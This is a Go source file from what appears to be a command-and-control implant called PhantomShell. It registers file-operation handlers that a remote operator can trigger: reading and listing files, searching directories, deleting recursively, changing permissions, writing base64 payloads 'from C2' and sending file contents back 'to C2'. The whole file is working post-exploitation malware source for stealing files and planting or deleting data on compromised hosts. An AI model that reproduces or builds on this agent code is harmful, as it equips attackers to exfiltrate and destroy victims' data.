package modules

import (
	"crypto/md5"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/OmonovSarvar/PhantomShell/agents/go/core"
)

func RegisterFileOps(d *core.Dispatcher) {
	d.Register("cat", handleCat)
	d.Register("head", handleHead)
	d.Register("tail", handleTail)
	d.Register("ls", handleLs)
	d.Register("upload", handleUpload)
	d.Register("download", handleDownload)
	d.Register("find", handleFind)
	d.Register("mkdir", handleMkdir)
	d.Register("rm", handleRm)
	d.Register("cp", handleCp)
	d.Register("mv", handleMv)
	d.Register("chmod", handleChmod)
	d.Register("hash", handleHash)
}

func getString(args map[string]interface{}, key string) string {
	if v, ok := args[key]; ok {
		if s, ok := v.(string); ok {
			return s
		}
	}
	return ""
}

func getInt(args map[string]interface{}, key string, def int) int {
	if v, ok := args[key]; ok {
		switch n := v.(type) {
		case float64:
			return int(n)
		case int:
			return n
		}
	}
	return def
}

func handleCat(args map[string]interface{}) map[string]interface{} {
	path := getString(args, "path")
	if path == "" {
		return map[string]interface{}{"status": "error", "error": "path required"}
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}
	return map[string]interface{}{"status": "success", "data": string(data)}
}

func handleHead(args map[string]interface{}) map[string]interface{} {
	path := getString(args, "path")
	lines := getInt(args, "lines", 10)
	if path == "" {
		return map[string]interface{}{"status": "error", "error": "path required"}
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}
	all := strings.Split(string(data), "\n")
	if lines > len(all) {
		lines = len(all)
	}
	return map[string]interface{}{"status": "success", "data": strings.Join(all[:lines], "\n")}
}

func handleTail(args map[string]interface{}) map[string]interface{} {
	path := getString(args, "path")
	lines := getInt(args, "lines", 10)
	if path == "" {
		return map[string]interface{}{"status": "error", "error": "path required"}
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}
	all := strings.Split(string(data), "\n")
	start := len(all) - lines
	if start < 0 {
		start = 0
	}
	return map[string]interface{}{"status": "success", "data": strings.Join(all[start:], "\n")}
}

func handleLs(args map[string]interface{}) map[string]interface{} {
	path := getString(args, "path")
	if path == "" {
		path = "."
	}
	entries, err := os.ReadDir(path)
	if err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}

	var items []map[string]interface{}
	for _, e := range entries {
		info, _ := e.Info()
		item := map[string]interface{}{
			"name":  e.Name(),
			"isdir": e.IsDir(),
		}
		if info != nil {
			item["size"] = info.Size()
			item["mode"] = info.Mode().String()
			item["mtime"] = info.ModTime().Format(time.RFC3339)
		}
		items = append(items, item)
	}
	return map[string]interface{}{"status": "success", "data": items}
}

// upload: receive base64-encoded file content from C2 and write to disk
func handleUpload(args map[string]interface{}) map[string]interface{} {
	path := getString(args, "path")
	content := getString(args, "content")
	if path == "" || content == "" {
		return map[string]interface{}{"status": "error", "error": "path and content required"}
	}
	data, err := base64.StdEncoding.DecodeString(content)
	if err != nil {
		return map[string]interface{}{"status": "error", "error": fmt.Sprintf("decode: %s", err)}
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}
	return map[string]interface{}{"status": "success", "size": len(data)}
}

// download: read file from disk and return base64-encoded content to C2
func handleDownload(args map[string]interface{}) map[string]interface{} {
	path := getString(args, "path")
	if path == "" {
		return map[string]interface{}{"status": "error", "error": "path required"}
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}
	return map[string]interface{}{
		"status":  "success",
		"content": base64.StdEncoding.EncodeToString(data),
		"size":    len(data),
	}
}

func handleFind(args map[string]interface{}) map[string]interface{} {
	root := getString(args, "path")
	if root == "" {
		root = "."
	}
	nameFilter := getString(args, "name")
	maxSize := int64(getInt(args, "maxsize", 0))

	var results []string
	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // skip inaccessible paths
		}
		if nameFilter != "" {
			matched, _ := filepath.Match(nameFilter, info.Name())
			if !matched {
				return nil
			}
		}
		if maxSize > 0 && !info.IsDir() && info.Size() > maxSize {
			return nil
		}
		results = append(results, path)
		if len(results) > 10000 {
			return fmt.Errorf("result limit reached")
		}
		return nil
	})
	if err != nil && len(results) == 0 {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}
	return map[string]interface{}{"status": "success", "data": results, "count": len(results)}
}

func handleMkdir(args map[string]interface{}) map[string]interface{} {
	path := getString(args, "path")
	if path == "" {
		return map[string]interface{}{"status": "error", "error": "path required"}
	}
	if err := os.MkdirAll(path, 0755); err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}
	return map[string]interface{}{"status": "success"}
}

func handleRm(args map[string]interface{}) map[string]interface{} {
	path := getString(args, "path")
	if path == "" {
		return map[string]interface{}{"status": "error", "error": "path required"}
	}
	if err := os.RemoveAll(path); err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}
	return map[string]interface{}{"status": "success"}
}

func handleCp(args map[string]interface{}) map[string]interface{} {
	src := getString(args, "src")
	dst := getString(args, "dst")
	if src == "" || dst == "" {
		return map[string]interface{}{"status": "error", "error": "src and dst required"}
	}
	srcFile, err := os.Open(src)
	if err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}
	defer srcFile.Close()

	dstFile, err := os.Create(dst)
	if err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}
	defer dstFile.Close()

	n, err := io.Copy(dstFile, srcFile)
	if err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}
	return map[string]interface{}{"status": "success", "bytes_copied": n}
}

func handleMv(args map[string]interface{}) map[string]interface{} {
	src := getString(args, "src")
	dst := getString(args, "dst")
	if src == "" || dst == "" {
		return map[string]interface{}{"status": "error", "error": "src and dst required"}
	}
	if err := os.Rename(src, dst); err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}
	return map[string]interface{}{"status": "success"}
}

func handleChmod(args map[string]interface{}) map[string]interface{} {
	path := getString(args, "path")
	mode := getInt(args, "mode", 0)
	if path == "" || mode == 0 {
		return map[string]interface{}{"status": "error", "error": "path and mode required"}
	}
	if err := os.Chmod(path, os.FileMode(mode)); err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}
	return map[string]interface{}{"status": "success"}
}

func handleHash(args map[string]interface{}) map[string]interface{} {
	path := getString(args, "path")
	if path == "" {
		return map[string]interface{}{"status": "error", "error": "path required"}
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return map[string]interface{}{"status": "error", "error": err.Error()}
	}
	md5sum := md5.Sum(data)
	sha1sum := sha1.Sum(data)
	sha256sum := sha256.Sum256(data)
	return map[string]interface{}{
		"status": "success",
		"md5":    fmt.Sprintf("%x", md5sum),
		"sha1":   fmt.Sprintf("%x", sha1sum),
		"sha256": fmt.Sprintf("%x", sha256sum),
	}
}
